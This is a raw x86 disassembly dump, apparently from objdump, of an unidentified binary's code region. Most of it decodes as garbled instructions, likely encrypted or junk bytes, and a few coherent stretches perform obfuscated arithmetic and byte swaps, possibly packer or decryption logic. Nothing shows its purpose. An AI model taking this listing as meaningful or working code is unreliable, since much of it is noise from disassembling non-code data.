  40448b:	shr    eax,1
  40448d:	ret    0x5d8b
  404490:	lock jmp 0x4045f6
  404496:	psraw  mm6,0x10
  40449a:	out    0xfb,al
  40449c:	frstor ds:0xaa51ed7e
  4044a2:	or     BYTE PTR [edi+esi*4],0x37
  4044a6:	jle    0x4044c7
  4044a8:	jl     0x404526
  4044aa:	xor    al,0x7f
  4044ac:	jl     0x40452a
  4044ae:	xor    cl,BYTE PTR [edx-0x7cea5c44]
  4044b4:	jmp    0xd6915349
  4044b9:	push   edx
  4044ba:	dec    edi
  4044bb:	aaa    
  4044bc:	add    DWORD PTR [eax+eiz*8+0x3f],eax
  4044c0:	dec    esp
  4044c1:	popf   
  4044c2:	jb     0x4044e2
  4044c4:	or     DWORD PTR [esi+0x7c],ebp
  4044c7:	and    DWORD PTR [edx],ecx
  4044c9:	sar    BYTE PTR [eax+0x2f],1
  4044cc:	stos   BYTE PTR es:[edi],al
  4044cd:	arpl   WORD PTR [eax],ax
  4044cf:	and    esp,DWORD PTR [edx]
  4044d1:	outs   dx,BYTE PTR ds:[esi]
  4044d2:	pop    ds
  4044d3:	int    0xd8
  4044d5:	repnz inc esi
  4044d7:	push   edx
  4044d8:	xchg   esp,eax
  4044d9:	pop    edi
  4044da:	out    0x3d,eax
  4044dc:	mov    ecx,0x962efcf
  4044e1:	jae    0x404538
  4044e3:	push   edi
  4044e4:	retf   0x9d41
  4044e7:	xchg   esi,eax
  4044e8:	inc    edi
  4044e9:	inc    esi
  4044ea:	push   ebx
  4044eb:	adc    DWORD PTR [ebx-0x1d],edx
  4044ee:	fisttp QWORD PTR [ebx-0x17e5454c]
  4044f4:	lahf   
  4044f5:	test   ch,ah
  4044f7:	sbb    ebp,DWORD PTR [esi-0x77f34569]
  4044fd:	jle    0x4044e2
  4044ff:	jmp    0xdddc3252
  404504:	fnstcw WORD PTR [edx]
  404506:	push   ecx
  404507:	jnp    0x40455c
  404509:	(bad)  
  40450a:	outs   dx,DWORD PTR ds:[esi]
  40450b:	fld    QWORD PTR [edi+0x78]
  40450e:	loope  0x4044eb
  404510:	jae    0x4044db
  404512:	jmp    0x5574:0xec92ecad
  404519:	scas   eax,DWORD PTR es:[edi]
  40451a:	push   esp
  40451b:	outs   dx,BYTE PTR ds:[esi]
  40451c:	mov    ds:0x838cbf78,al
  404521:	inc    esi
  404522:	ins    BYTE PTR es:[edi],dx
  404523:	pop    esp
  404524:	xchg   esp,eax
  404525:	xor    eax,0x39fe2e40
  40452a:	or     ch,BYTE PTR [edi]
  40452c:	popa   
  40452d:	mov    ds:0x1fc004bd,eax
  404532:	pusha  
  404533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404534:	iret   
  404535:	dec    ebx
  404536:	add    al,0x24
  404538:	jnp    0x404534
  40453a:	mov    cl,0xe9
  40453c:	ins    BYTE PTR es:[edi],dx
  40453d:	sbb    edx,DWORD PTR [ebp-0x13]
  404540:	cmc    
  404541:	pop    esp
  404542:	and    BYTE PTR [ecx+0x5da8a160],bl
  404548:	cmp    eax,0xee8b7b0a
  40454d:	dec    ebx
  40454e:	inc    edi
  40454f:	or     BYTE PTR [ecx+0x1e],dl
  404552:	jno    0x40452e
  404554:	mov    ds:0x11e6681c,al
  404559:	leave  
  40455a:	dec    edi
  40455b:	fs aaa 
  40455d:	mov    ebx,0x2ac3f05d
  404562:	add    eax,0x60ed94a0
  404567:	cs std 
  404569:	(bad)  
  40456a:	mov    esp,0x8d571c22
  40456f:	das    
  404570:	jg     0x4044f7
  404572:	xchg   esi,eax
  404573:	jl     0x40456e
  404575:	jo     0x404519
  404577:	or     eax,0xd0ca98f4
  40457c:	or     edx,DWORD PTR [esi]
  40457e:	push   ecx
  40457f:	sub    eax,0xc0301fb5
  404584:	mov    es,WORD PTR [esi-0x5ba70b09]
  40458a:	pushf  
  40458b:	adc    DWORD PTR [esi],ebp
  40458d:	add    al,0x27
  40458f:	cs gs stc 
  404592:	inc    esi
  404593:	xchg   ebp,eax
  404594:	mov    bh,0x72
  404596:	popa   
  404597:	sub    DWORD PTR [esi],ebx
  404599:	push   0xffffffb4
  40459b:	push   esp
  40459c:	cld    
  40459d:	stos   BYTE PTR es:[edi],al
  40459e:	or     al,0x66
  4045a0:	sti    
  4045a1:	push   edx
  4045a2:	or     ebx,DWORD PTR [edx]
  4045a4:	outs   dx,BYTE PTR ds:[esi]
  4045a5:	mov    ebp,0x6cad439f
  4045aa:	into   
  4045ab:	sub    BYTE PTR [edx],ch
  4045ad:	retf   
  4045ae:	xchg   esp,eax
  4045af:	mov    dl,0x3
  4045b1:	ds sahf 
  4045b3:	push   ss
  4045b4:	jno    0x4045ec
  4045b6:	adc    esi,edi
  4045b8:	scas   eax,DWORD PTR es:[edi]
  4045b9:	sbb    DWORD PTR [ecx],ebp
  4045bb:	cwde   
  4045bc:	pop    esi
  4045bd:	push   ds
  4045be:	inc    esp
  4045bf:	jno    0x40457e
  4045c1:	mov    bh,0xa6
  4045c3:	int3   
  4045c4:	dec    esp
  4045c5:	ficom  WORD PTR [edx+0x56]
  4045c8:	adc    eax,0xe654a69b
  4045cd:	mov    edi,0x21689c7b
  4045d2:	ins    BYTE PTR es:[edi],dx
  4045d3:	pop    eax
  4045d4:	cmp    dl,BYTE PTR [ebx+0x25]
  4045d7:	stos   DWORD PTR es:[edi],eax
  4045d8:	and    eax,0xc73ae83e
  4045dd:	mov    ?,WORD PTR [edx]
  4045df:	(bad)  
  4045e0:	mov    edi,edi
  4045e2:	gs jp  0x4045cc
  4045e5:	jne    0x40458b
  4045e7:	push   ds
  4045e8:	enter  0xd90d,0x50
  4045ec:	aas    
  4045ed:	jo     0x4045f3
  4045ef:	ficom  DWORD PTR [edx-0x36]
  4045f2:	or     BYTE PTR [esi],ch
  4045f4:	test   al,0xf0
  4045f6:	sub    ebx,edi
  4045f8:	cmp    ebx,edx
  4045fa:	ja     0x404608
  404600:	mov    edx,DWORD PTR [ebp-0x34]
  404603:	jmp    0x40462f
  404608:	mov    edx,DWORD PTR [ebp-0x3c]
  40460b:	mov    edi,DWORD PTR [ebp-0x4]
  40460e:	xor    edx,eax
  404610:	xor    edi,eax
  404612:	add    edx,ecx
  404614:	add    edi,ecx
  404616:	imul   edx,edi
  404619:	mov    edi,DWORD PTR [ebp-0x8]
  40461c:	mov    ebx,DWORD PTR [ebp-0x10]
  40461f:	sub    ebx,edi
  404621:	cmp    ebx,edx
  404623:	mov    edx,DWORD PTR [ebp-0x38]
  404626:	jbe    0x40462f
  40462c:	mov    edx,DWORD PTR [ebp-0x3c]
  40462f:	mov    edi,DWORD PTR [ebp-0x4]
  404632:	xor    edi,eax
  404634:	xor    edx,eax
  404636:	add    edi,ecx
  404638:	add    edx,ecx
  40463a:	jmp    0x40479f
  40463f:	mov    WORD PTR [ecx+esi*8+0x3f],es
  404643:	dec    ecx
  404644:	(bad)  [esi+0x47]
  404647:	stos   BYTE PTR es:[edi],al
  404648:	call   0xce26:0x3ec4b2d5
  40464f:	ss push ds
  404651:	jl     0x4046cf
  404653:	xor    al,0x7f
  404655:	jl     0x4046d3
  404657:	adc    eax,0x57d096c0
  40465c:	dec    ecx
  40465d:	std    
  40465e:	pop    es
  40465f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404660:	in     al,dx
  404661:	pusha  
  404662:	hlt    
  404663:	xchg   BYTE PTR [eax],al
  404665:	and    DWORD PTR [esp+ecx*4],edx
  404668:	push   0x21
  40466a:	jmp    0xd395:0x9b236ee3
  404671:	test   BYTE PTR ds:[ebp+0x5e51b38e],bl
  404678:	xor    dh,BYTE PTR [edi-0xc]
  40467b:	pushf  
  40467c:	mov    edi,0x797ee6cf
  404681:	aaa    
  404682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404683:	pushf  
  404684:	pop    ebp
  404685:	out    dx,al
  404686:	imul   edi,ecx,0x71
  404689:	or     DWORD PTR [edx-0x36],ebp
  40468c:	pusha  
  40468d:	push   eax
  40468e:	bound  esi,QWORD PTR [edi]
  404690:	sbb    eax,0x2c974a6b
  404695:	and    edx,DWORD PTR [esi]
  404697:	sbb    eax,0xf5bccc09
  40469c:	jle    0x4046cd
  40469e:	inc    esp
  40469f:	jge    0x404663
  4046a1:	adc    eax,0xd8ebca1c
  4046a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046a7:	stc    
  4046a8:	hlt    
  4046a9:	out    dx,al
  4046aa:	adc    DWORD PTR [esi],esp
  4046ac:	nop
  4046ad:	imul   ebp,DWORD PTR [edx+0x24d1f790],0x3
  4046b4:	sar    DWORD PTR [edx],cl
  4046b6:	xchg   BYTE PTR [eax+0x3079df3b],cl
  4046bc:	cwde   
  4046bd:	jae    0x404689
  4046bf:	sbb    eax,0xde125151
  4046c4:	push   es
  4046c5:	xor    ebx,DWORD PTR [ebx+0x2b7d9838]
  4046cb:	call   0x7c571b68
  4046d0:	or     DWORD PTR [ebx+0x1b],ecx
  4046d3:	test   dl,bl
  4046d5:	dec    eax
  4046d6:	push   eax
  4046d7:	jno    0x40465c
  4046d9:	call   0x832a9d8f
  4046de:	pop    ebx
  4046df:	retf   
  4046e0:	and    al,0x4d
  4046e2:	lds    edx,FWORD PTR [esi-0x52]
  4046e5:	lahf   
  4046e6:	xchg   BYTE PTR [edx-0x10db8336],ch
  4046ec:	arpl   WORD PTR cs:[esi+0x50dcd094],bx
  4046f3:	cdq    
  4046f4:	fisubr WORD PTR [ebx+0x2ea45a8a]
  4046fa:	cmc    
  4046fb:	adc    eax,DWORD PTR ds:0x4237d480
  404701:	adc    ecx,0xcb5157e6
  404707:	(bad)  
  404708:	ins    BYTE PTR es:[edi],dx
  404709:	inc    ebx
  40470a:	cmp    bh,ch
  40470c:	ins    BYTE PTR es:[edi],dx
  40470d:	dec    ecx
  40470e:	adc    esi,DWORD PTR [edx-0x28f69807]
  404714:	repz shl esi,cl
  404717:	out    0xda,al
  404719:	mov    eax,ds:0x912184ea
  40471e:	outs   dx,BYTE PTR ds:[esi]
  40471f:	in     al,0x1f
  404721:	leave  
  404722:	jns    0x404737
  404724:	cmp    eax,0x634145b
  404729:	xlat   BYTE PTR ds:[ebx]
  40472a:	adc    eax,0x2d647d42
  40472f:	imul   DWORD PTR ds:0xa24cc5d6
  404735:	dec    BYTE PTR [ecx-0x5c]
  404738:	sbb    bl,BYTE PTR [ebp-0x13]
  40473b:	ins    BYTE PTR es:[edi],dx
  40473c:	aam    0x9b
  40473e:	je     0x404767
  404740:	(bad)  
  404741:	xor    BYTE PTR [ebx+0x6a361d62],dh
  404747:	jp     0x404777
  404749:	imul   eax,esi,0xb21ccfab
  40474f:	cld    
  404750:	loop   0x40472d
  404752:	mov    bh,0xe2
  404754:	pop    ecx
  404755:	pop    es
  404756:	stc    
  404757:	les    edx,FWORD PTR [edx]
  404759:	lods   al,BYTE PTR ds:[esi]
  40475a:	repz mov bl,dh
  40475d:	sub    BYTE PTR [esi-0x1f],cl
  404760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404761:	mov    ch,0x94
  404763:	xchg   esp,eax
  404764:	jae    0x4047d3
  404766:	adc    cl,BYTE PTR [esi-0x6c60606e]
  40476c:	imul   esi,DWORD PTR [ebx+0x300eab6d],0xffffffc7
  404773:	pop    ecx
  404774:	add    al,dh
  404776:	inc    edx
  404777:	fldenv [eax+0x6fc1183f]
  40477d:	sub    DWORD PTR [eax-0x4151e1ce],esp
  404783:	push   ebp
  404784:	lock sbb ebx,DWORD PTR [esi]
  404787:	pop    eax
  404788:	sub    ebx,eax
  40478a:	adc    eax,0xcfb6ffcc
  40478f:	retf   0xd58b
  404792:	mov    ds:0xda49657,eax
  404797:	pmaddwd mm0,QWORD PTR [ecx-0x5f906ab0]
  40479e:	pop    edx
  40479f:	imul   edx,edi
  4047a2:	mov    DWORD PTR [ebp+0xc],edx
  4047a5:	mov    edx,DWORD PTR [ebp+0xc]
  4047a8:	mov    DWORD PTR [ebp-0x24],edx
  4047ab:	mov    edx,DWORD PTR [ebp-0x8]
  4047ae:	add    edx,DWORD PTR [ebp-0x40]
  4047b1:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  4047b8:	mov    DWORD PTR [ebp-0x1c],edx
  4047bb:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  4047c2:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4047c9:	mov    edx,DWORD PTR [ebp-0x18]
  4047cc:	xor    edx,eax
  4047ce:	add    edx,ecx
  4047d0:	jmp    0x404c6c
  4047d5:	mov    edx,DWORD PTR [ebp-0x18]
  4047d8:	xor    edx,eax
  4047da:	add    edx,DWORD PTR [ebp-0x14]
  4047dd:	mov    edi,DWORD PTR [ebp-0x1c]
  4047e0:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  4047e7:	mov    BYTE PTR [ebp+0xf],dl
  4047ea:	jmp    0x40494f
  4047ef:	int    0xf4
  4047f1:	mov    esi,0xfd66b566
  4047f6:	mov    ebx,0x8fce1da9
  4047fb:	ja     0x40487b
  4047fd:	pop    esi
  4047fe:	mov    ss,WORD PTR [bx+di]
  404801:	jl     0x40487f
  404803:	xor    al,0x7f
  404805:	jl     0x404883
  404807:	fnsave [edx]
  404809:	pop    esp
  40480a:	add    DWORD PTR [ebx],edi
  40480c:	je     0x40487e
  40480e:	xchg   ebp,eax
  40480f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404810:	xchg   esi,eax
  404811:	push   es
  404812:	mov    edi,0x3abbb519
  404817:	adc    BYTE PTR [edi-0x194c44ac],bh
  40481d:	xchg   ebx,eax
  40481e:	test   BYTE PTR [edi-0x33478cc3],ah
  404824:	or     al,0x9f
  404826:	xchg   ecx,eax
  404827:	push   esi
  404828:	in     eax,0x7
  40482a:	cmp    eax,0xb1e76262
  40482f:	out    dx,al
  404830:	aas    
  404831:	fadd   DWORD PTR [eax+ebp*1-0x681d50fd]
  404838:	(bad)  
  404839:	sub    ah,BYTE PTR [eax-0x798d3370]
  40483f:	xor    eax,0x16892cdb
  404844:	pop    es
  404845:	xor    bl,BYTE PTR [esi]
  404847:	cdq    
  404848:	pop    esi
  404849:	add    al,0x64
  40484b:	mov    si,0x7a78
  40484f:	push   esi
  404850:	outs   dx,BYTE PTR ds:[esi]
  404851:	mov    ebx,0xd663f719
  404856:	xor    ebx,DWORD PTR [ecx+edx*8-0x3e]
  40485a:	mov    ebp,0x83d4042b
  40485f:	int3   
  404860:	js     0x404860
  404862:	jmp    0xded604b5
  404867:	push   ds
  404868:	jo     0x4047f0
  40486a:	xchg   ebx,eax
  40486b:	push   ebp
  40486c:	rol    DWORD PTR [ecx-0x29],cl
  40486f:	push   ss
  404870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404871:	jbe    0x40483c
  404873:	cmp    eax,0xe5a63cd1
  404878:	mov    dl,0x49
  40487a:	sub    DWORD PTR [eax+0x71],0xffffff96
  40487e:	ficom  DWORD PTR [ebx-0x1f40c8b2]
  404884:	(bad)  
  404885:	sti    
  404886:	imul   eax,DWORD PTR ds:0x88990ab3,0x71
  40488d:	dec    esp
  40488e:	jecxz  0x40489d
  404890:	push   cs
  404891:	shl    dh,1
  404893:	lds    eax,FWORD PTR [edx]
  404895:	pop    esp
  404896:	test   eax,0x73ff8b18
  40489b:	sti    
  40489c:	loopne 0x404837
  40489e:	mov    ebp,0xa899fbfb
  4048a3:	push   cs
  4048a4:	out    dx,eax
  4048a5:	pusha  
  4048a6:	mov    edx,0x8dfcaac7
  4048ab:	rcr    esp,0x51
  4048ae:	adc    al,0x73
  4048b0:	inc    esp
  4048b1:	mov    DWORD PTR [esi+0x7],esi
  4048b4:	and    ecx,edi
  4048b6:	or     dl,BYTE PTR [ebx]
  4048b8:	cli    
  4048b9:	xor    DWORD PTR [ebx],edx
  4048bb:	add    eax,0x7a91b47e
  4048c0:	loop   0x404925
  4048c2:	pop    edi
  4048c3:	dec    esi
  4048c4:	or     eax,0xb87e8aa5
  4048c9:	sub    dh,BYTE PTR cs:[esi]
  4048cc:	mov    ds:0x1202a1f0,eax
  4048d1:	mov    eax,0xb56f38c3
  4048d6:	sbb    cl,BYTE PTR [ecx-0x33]
  4048d9:	dec    esi
  4048da:	js     0x404938
  4048dc:	pushf  
  4048dd:	and    BYTE PTR [ecx+0x153e72be],0x1e
  4048e4:	jo     0x4048f0
  4048e6:	jns    0x404876
  4048e8:	popf   
  4048e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048ea:	jae    0x404889
  4048ec:	mov    ebp,0xca1990b2
  4048f1:	fisub  WORD PTR ds:0x5cba2e95
  4048f7:	jecxz  0x4048e1
  4048f9:	cmp    ah,bl
  4048fb:	mov    WORD PTR [ecx-0x5],?
  4048fe:	dec    esp
  4048ff:	sub    al,0xe9
  404901:	ins    BYTE PTR es:[edi],dx
  404902:	es mov ecx,0xaca51e01
  404908:	cmp    eax,0x703990e4
  40490d:	inc    ecx
  40490e:	scas   al,BYTE PTR es:[edi]
  40490f:	(bad)  
  404910:	add    ecx,0x5e
  404913:	jmp    0x23a0:0x5ee0469b
  40491a:	mov    ah,0x68
  40491c:	stos   DWORD PTR es:[edi],eax
  40491d:	adc    al,0xd6
  40491f:	or     al,0xc0
  404921:	add    eax,0xb9c77e69
  404926:	push   cs
  404927:	jns    0x404901
  404929:	adc    al,bl
  40492b:	inc    esp
  40492c:	mov    esi,0xd98110ea
  404931:	push   eax
  404932:	inc    esi
  404933:	inc    eax
  404934:	aam    0x4e
  404936:	mov    bh,0x38
  404938:	out    dx,al
  404939:	fst    DWORD PTR [eax-0xc6e3e86]
  40493f:	push   ss
  404940:	jbe    0x404907
  404942:	fstp   QWORD PTR [edi]
  404944:	mov    esp,fs
  404946:	xchg   ebp,eax
  404947:	daa    
  404948:	push   ds
  404949:	gs nop
  40494b:	or     al,0x36
  40494d:	jne    0x4049a4
  40494f:	mov    edx,DWORD PTR [ebp-0xc]
  404952:	xor    edx,eax
  404954:	add    edx,DWORD PTR [ebp-0x14]
  404957:	mov    edi,DWORD PTR [ebp-0x1c]
  40495a:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  404961:	mov    BYTE PTR [ebp+0xb],dl
  404964:	mov    dl,BYTE PTR [ebp+0xf]
  404967:	mov    edi,DWORD PTR [ebp-0xc]
  40496a:	xor    edi,eax
  40496c:	add    edi,DWORD PTR [ebp-0x14]
  40496f:	mov    ebx,DWORD PTR [ebp-0x1c]
  404972:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404979:	jmp    0x404ade
  40497e:	adc    ebx,DWORD PTR cs:[ecx]
  404981:	iret   
  404982:	sbb    eax,0xb1d5e6fd
  404987:	and    edi,DWORD PTR ss:[ebx+0x393f660c]
  40498e:	inc    esi
  40498f:	adc    BYTE PTR [esp+edi*2+0x34],bh
  404993:	jg     0x404a11
  404995:	jl     0x40491d
  404997:	pop    ebp
  404998:	cld    
  404999:	sar    BYTE PTR [edx-0x4de02dd2],0x93
  4049a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049a1:	int3   
  4049a2:	sub    BYTE PTR [ecx+0x4e],ah
  4049a5:	cwde   
  4049a6:	jnp    0x404948
  4049a8:	ja     0x404998
  4049aa:	pushf  
  4049ab:	jae    0x4049ce
  4049ad:	xchg   ebx,eax
  4049ae:	jle    0x40498e
  4049b0:	add    bl,BYTE PTR [ebp-0x6c]
  4049b3:	push   0x55
  4049b5:	mov    ebp,0x5f55d643
  4049ba:	bound  esp,QWORD PTR ds:0xbe15ea2b
  4049c0:	cmc    
  4049c1:	jp     0x404983
  4049c3:	ja     0x404958
  4049c5:	lea    edx,[ebx+ebx*4]
  4049c8:	xor    al,0x98
  4049ca:	rcl    DWORD PTR [ecx+0x59],0xd3
  4049ce:	xor    al,dh
  4049d0:	inc    esi
  4049d1:	cmp    BYTE PTR [esi-0x29e18cf9],dl
  4049d7:	xchg   edi,eax
  4049d8:	jge    0x4049a1
  4049da:	in     al,dx
  4049db:	retf   0xd990
  4049de:	loop   0x4049bc
  4049e0:	js     0x404a01
  4049e2:	in     eax,dx
  4049e3:	xlat   BYTE PTR cs:[ebx]
  4049e5:	fcmovnbe st,st(1)
  4049e7:	mov    eax,0x160f28fa
  4049ec:	mov    ah,0x9
  4049ee:	call   0xe4d:0x1228c8d4
  4049f5:	xor    eax,DWORD PTR [edx+0x7e]
  4049f8:	inc    eax
  4049f9:	mov    dh,BYTE PTR [edi+0x3e]
  4049fc:	jne    0x40498f
  4049fe:	cmp    al,0x97
  404a00:	adc    esp,DWORD PTR [ecx-0x45]
  404a03:	call   0x4037ef21
  404a08:	and    dh,ch
  404a0a:	retf   0xa7e2
  404a0d:	xor    al,0x3c
  404a0f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a11:	cmp    BYTE PTR [esi-0x4a],cl
  404a14:	popa   
  404a15:	jb     0x4049d7
  404a17:	mov    edx,0xb6858891
  404a1c:	loope  0x404a8d
  404a1e:	leave  
  404a1f:	imul   esp,DWORD PTR [ecx+0x7c334c2a],0xffffffee
  404a26:	les    ebx,FWORD PTR [ecx+0x3cdd692d]
  404a2c:	call   0xd2685479
  404a31:	out    dx,al
  404a32:	ret    0x61dc
  404a35:	xchg   DWORD PTR [esi-0x6933d9ad],ebp
  404a3b:	add    dl,dh
  404a3d:	mov    ecx,eax
  404a3f:	cmp    DWORD PTR [edx+0x2d],0x28a419ab
  404a46:	pcmpgtd mm7,QWORD PTR [edx]
  404a49:	cmc    
  404a4a:	dec    esp
  404a4b:	dec    edx
  404a4c:	push   0xffffffc5
  404a4e:	sbb    DWORD PTR [ebx],esi
  404a50:	call   0xd213:0xf6adbc02
  404a57:	mov    bh,BYTE PTR [edx+0x6ae92c4c]
  404a5d:	xor    ebp,DWORD PTR [esp+ebx*8+0x7e]
  404a61:	cwde   
  404a62:	test   BYTE PTR [ebx-0x17],ch
  404a65:	push   ds
  404a66:	add    DWORD PTR [ebx+0x39a2b720],0x6a
  404a6d:	push   esp
  404a6e:	sub    ch,bh
  404a70:	mov    ebp,cs
  404a72:	or     dh,al
  404a74:	addr16 xchg edx,eax
  404a76:	fsubr  QWORD PTR [ebx-0x24]
  404a79:	mov    esi,0x6eaf1ba0
  404a7e:	out    0xbf,eax
  404a80:	int3   
  404a81:	mov    ebp,0xafcf7b98
  404a86:	ins    DWORD PTR es:[edi],dx
  404a87:	xchg   esi,eax
  404a88:	les    dx,DWORD PTR [esi+0x76]
  404a8c:	add    ebp,DWORD PTR [ebp+0x37]
  404a8f:	push   0x1023ac05
  404a94:	call   0x786c4131
  404a99:	cmp    dl,ch
  404a9b:	dec    ebx
  404a9c:	pusha  
  404a9d:	inc    ebp
  404a9e:	mov    ebx,0x88001551
  404aa3:	mov    dl,0xc4
  404aa5:	ds je  0x404aae
  404aa8:	outs   dx,BYTE PTR ds:[esi]
  404aa9:	add    DWORD PTR [ebx+0x7254aeaa],ecx
  404aaf:	ins    BYTE PTR es:[edi],dx
  404ab0:	jge    0x404a43
  404ab2:	dec    ebx
  404ab3:	movzx  eax,BYTE PTR ds:0x8b3c1bfe
  404aba:	test   BYTE PTR [edi],bl
  404abc:	inc    esp
  404abd:	jb     0x404acd
  404abf:	imul   esi,DWORD PTR [eax+0x6e],0x45
  404ac3:	jbe    0x404ae9
  404ac5:	add    ah,dh
  404ac7:	cmc    
  404ac8:	sbb    al,BYTE PTR ss:[eax-0x2a]
  404acc:	cmp    BYTE PTR [edi],0xac
  404acf:	add    eax,DWORD PTR [esi]
  404ad1:	cmc    
  404ad2:	icebp  
  404ad3:	jecxz  0x404b1d
  404ad5:	push   0x56
  404ad7:	aad    0x91
  404ad9:	pop    es
  404ada:	mov    bh,0xfa
  404adc:	in     al,dx
  404add:	ror    BYTE PTR [edx+0x7d8b0b55],0xe8
  404ae4:	xor    edi,eax
  404ae6:	add    edi,DWORD PTR [ebp-0x14]
  404ae9:	mov    ebx,DWORD PTR [ebp-0x1c]
  404aec:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404af3:	mov    edx,DWORD PTR [ebp-0x44]
  404af6:	mov    edi,DWORD PTR [ebp-0xc]
  404af9:	xor    edx,eax
  404afb:	xor    edi,eax
  404afd:	add    edx,ecx
  404aff:	add    edi,ecx
  404b01:	imul   edx,edi
  404b04:	add    edx,DWORD PTR [ebp-0x14]
  404b07:	jmp    0x404c6c
  404b0c:	stos   DWORD PTR es:[edi],eax
  404b0d:	outs   dx,BYTE PTR ds:[esi]
  404b0e:	cmp    al,0x3d
  404b10:	fnstsw WORD PTR [ebp+0x313d6e7d]
  404b16:	lods   eax,DWORD PTR ds:[esi]
  404b17:	sbb    eax,0x44b64241
  404b1c:	push   ds
  404b1d:	adc    bh,BYTE PTR [esp+edi*2+0x34]
  404b21:	jg     0x404b9f
  404b23:	jl     0x404b5a
  404b25:	mov    al,ds:0xf36c4571
  404b2a:	and    al,BYTE PTR [edx+0x35]
  404b2d:	or     ebx,DWORD PTR [edx+0x77]
  404b30:	sbb    al,0x69
  404b32:	out    0x74,eax
  404b34:	mov    esi,0xd128728a
  404b39:	mov    esp,0x18f43301
  404b3e:	sub    dl,BYTE PTR [ecx+ebp*8+0x30]
  404b42:	pop    esi
  404b43:	hlt    
  404b44:	scas   eax,DWORD PTR es:[edi]
  404b45:	data16 lock mov ds:0x88e87045,al
  404b4c:	ja     0x404b5f
  404b4e:	adc    edi,DWORD PTR [ebx-0x49]
  404b51:	out    0x33,eax
  404b53:	loope  0x404af9
  404b55:	and    BYTE PTR [edx+0x37],dl
  404b58:	pop    ds
  404b59:	sub    ah,dl
  404b5b:	or     DWORD PTR [eax],edi
  404b5d:	mov    bl,0x78
  404b5f:	mov    ebp,0x536778a3
  404b64:	aam    0x7c
  404b66:	dec    ebp
  404b67:	mov    cl,0x75
  404b69:	dec    edx
  404b6a:	ins    BYTE PTR es:[edi],dx
  404b6b:	cmp    ebx,eax
  404b6d:	stos   BYTE PTR es:[edi],al
  404b6e:	adc    al,0xc0
  404b70:	nop
  404b71:	pop    ss
  404b72:	in     al,0xb4
  404b74:	adc    eax,0x95ac6c7b
  404b79:	xchg   ebp,eax
  404b7a:	cld    
  404b7b:	sub    al,0x99
  404b7d:	push   edx
  404b7e:	jmp    0x4e0c:0x9e8059c5
  404b85:	lods   al,BYTE PTR ds:[esi]
  404b86:	jne    0x404b4e
  404b88:	xor    eax,ecx
  404b8a:	mov    ebp,0xa92693f0
  404b8f:	shr    DWORD PTR [edi],0x31
  404b92:	xchg   esp,eax
  404b93:	sub    BYTE PTR [eax-0xc1dfe94],0xbc
  404b9a:	pop    esi
  404b9b:	adc    BYTE PTR [ebp+0x6c639ed2],0x6b
  404ba2:	out    0x44,al
  404ba4:	fwait
  404ba5:	jns    0x3b08f05c
  404bab:	dec    edx
  404bac:	sbb    ebp,DWORD PTR ds:0x9d31ecf5
  404bb2:	xchg   esp,eax
  404bb3:	fxtract 
  404bb5:	das    
  404bb6:	pop    esi
  404bb7:	ins    DWORD PTR es:[edi],dx
  404bb8:	loopne 0x404bba
  404bba:	in     al,dx
  404bbb:	jb     0x404bab
  404bbd:	in     eax,0x48
  404bbf:	addr16 xchg ebx,eax
  404bc1:	mov    esp,0x8c636d4d
  404bc6:	push   eax
  404bc7:	pop    ds
  404bc8:	cmp    ebp,DWORD PTR [eax]
  404bca:	mov    esp,0xa1a3c386
  404bcf:	adc    bl,BYTE PTR [ecx+esi*4+0x9]
  404bd3:	mov    ecx,0xec018bed
  404bd8:	jp     0x404c46
  404bda:	mov    esi,0xe53d59b9
  404bdf:	or     BYTE PTR [ebx],cl
  404be1:	jb     0x404c45
  404be3:	inc    eax
  404be4:	and    eax,0x4011dfde
  404be9:	mov    ds:0xda277748,al
  404bee:	push   ecx
  404bef:	nop
  404bf0:	test   al,0x11
  404bf2:	and    DWORD PTR [ecx+0x21695155],esp
  404bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bf9:	std    
  404bfa:	rcr    esp,1
  404bfc:	ins    BYTE PTR es:[edi],dx
  404bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bfe:	fisttp QWORD PTR [edi+0x2e6a3878]
  404c04:	hlt    
  404c05:	pop    ebp
  404c06:	cmp    BYTE PTR [eax+0x71c45144],0xa0
  404c0d:	and    al,dl
  404c0f:	pop    esi
  404c10:	loop   0x404bcc
  404c12:	scas   eax,DWORD PTR es:[edi]
  404c13:	jmp    0xc2dc:0x7ba161a0
  404c1a:	xchg   ecx,eax
  404c1b:	neg    DWORD PTR [eax+esi*2]
  404c1e:	inc    eax
  404c1f:	jge    0x404bca
  404c21:	xlat   BYTE PTR ds:[ebx]
  404c22:	pop    ds
  404c23:	xor    ah,BYTE PTR [eax-0x7d]
  404c26:	in     eax,0x2b
  404c28:	jns    0x404c81
  404c2a:	jmp    0x404bf8
  404c2c:	mov    cl,0x59
  404c2e:	cmp    DWORD PTR ds:0x24583d18,eax
  404c34:	bound  edi,QWORD PTR [edi+esi*8-0x4de62b25]
  404c3b:	sbb    edi,DWORD PTR [esi]
  404c3d:	and    DWORD PTR [edi+ebp*4],edi
  404c40:	xor    ecx,DWORD PTR [edx]
  404c42:	cmp    esp,ebx
  404c44:	sub    edx,0x93aa269d
  404c4a:	stc    
  404c4b:	les    edi,FWORD PTR [eax+ebx*4-0x2c6e8acd]
  404c52:	mov    ch,0x3d
  404c54:	cld    
  404c55:	push   eax
  404c56:	or     ebx,esp
  404c58:	bound  edx,QWORD PTR [eax]
  404c5a:	sub    eax,0x3989c6aa
  404c5f:	repnz xchg ecx,eax
